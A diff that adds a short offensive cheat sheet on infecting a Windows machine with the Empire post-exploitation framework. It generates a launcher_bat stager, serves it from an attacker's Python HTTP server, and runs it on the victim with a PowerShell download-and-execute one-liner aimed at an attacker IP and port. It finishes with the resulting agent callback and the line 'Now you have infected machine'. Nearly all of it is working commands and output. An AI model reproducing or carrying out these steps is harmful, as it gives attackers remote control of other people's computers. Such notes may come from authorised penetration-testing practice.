@@ -1,0 +1,41 @@
+Empire - Physical Access and Hosting Empire Stager On Local Network
+
+
+Creating stager and hosting web server
+
++ Create listener
+
++ Generate stager for infection
+	# (Empire) > usestager windows/launcher_bat
+
++ Configure the stager module
+	# (Empire: stager/windows/launcher_bat) > set Listener TargetME_Listener
+	
++ Generate stager module
+	# (Empire: stager/windows/launcher_bat) > generate
+	
+	[*] Stager output written out to: /tmp/launcher.bat
+	
++ Move the stager to designate folder
+	# mkdir ~/Desktop/EmpireStager
+	# mv /tmp/launcher.bat ~/Desktop/EmpireStager
+	
++ Start python simple server to serve as download server for possible client
+	# python -m SimpleHTTPServer 8080
+
+	Serving HTTP on 0.0.0.0 port 8080 ...
+
+
+Download methodology
+
++ Simple browsing to attacker web server and download the file from accessible victim machine and execute the batch script
+
++ Or run a command prompt with the following command from accessible victim machine
+	# Powershell (New-Object System.Net.webClient).DownloadFile('http://ip-webserver:port-number/launcher.bat','launcher.bat'); Start-Process 'launcher.bat'
+	# Powershell (New-Object System.Net.webClient).DownloadFile('http://192.168.202.141:8080/launcher.bat','launcher.bat'); Start-Process 'launcher.bat'
+
++ When the script is running, your listener should have connection with your agent and outputting as follow
+	
+	(Empire: stager/windows/launcher_bat) > [+] Initial agent KT3EWS8D from 192.168.202.148 now active (Slack)
+
++ Now you have infected machine
